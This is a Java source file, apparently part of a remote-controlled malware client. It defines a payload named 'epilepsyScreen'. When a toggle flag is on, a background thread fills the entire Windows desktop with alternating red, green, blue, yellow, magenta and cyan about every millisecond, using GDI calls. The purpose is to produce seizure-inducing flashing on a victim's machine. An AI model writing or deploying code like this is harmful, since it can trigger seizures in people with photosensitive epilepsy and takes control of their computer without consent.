package me.kutuzov.client.payloads;

import com.sun.jna.platform.win32.WinDef.*;
import me.kutuzov.client.w32.GDI32;
import me.kutuzov.client.w32.User32;

import java.util.concurrent.atomic.AtomicBoolean;

public class Payloads {
    public static AtomicBoolean epilepsyScreenEnabled = new AtomicBoolean(false);
    private static Thread epilepsyScreenThread = new Thread(() -> {
        int scrw = User32.INSTANCE.GetSystemMetrics(User32.SM_CXSCREEN);
        int scrh = User32.INSTANCE.GetSystemMetrics(User32.SM_CYSCREEN);
        int timesLooped = 0;

        RECT rect = new RECT();
        rect.left   = 0;
        rect.top    = 0;
        rect.right  = scrw;
        rect.bottom = scrh;
        HBRUSH hbrushR   = GDI32.INSTANCE.CreateSolidBrush(0x000000FF);
        HBRUSH hbrushG   = GDI32.INSTANCE.CreateSolidBrush(0x0000FF00);
        HBRUSH hbrushB   = GDI32.INSTANCE.CreateSolidBrush(0x00FF0000);
        HBRUSH hbrushRG  = GDI32.INSTANCE.CreateSolidBrush(0x0000FFFF);
        HBRUSH hbrushRB  = GDI32.INSTANCE.CreateSolidBrush(0x00FF00FF);
        HBRUSH hbrushGB  = GDI32.INSTANCE.CreateSolidBrush(0x00FFFF00);

        while(true) {
            if(Payloads.epilepsyScreenEnabled.get()) {
                HWND hwnd = User32.INSTANCE.GetDesktopWindow();
                HDC hdc = User32.INSTANCE.GetWindowDC(hwnd);

                GDI32.INSTANCE.SetDCBrushColor(hdc, 0x000000FF);
                User32.INSTANCE.FillRect(hdc, rect, timesLooped==0?hbrushR:timesLooped==1?hbrushG:timesLooped==2?hbrushB:timesLooped==3?hbrushRG:timesLooped==4?hbrushRB:hbrushGB);
                User32.INSTANCE.ReleaseDC(hwnd, hdc);

                if(timesLooped == 5)
                    timesLooped = -1;
                timesLooped++;
            }

            try { Thread.sleep(1); } catch (InterruptedException exception) { break; }
        }
    });

    static {
        epilepsyScreenThread.start();
    }
}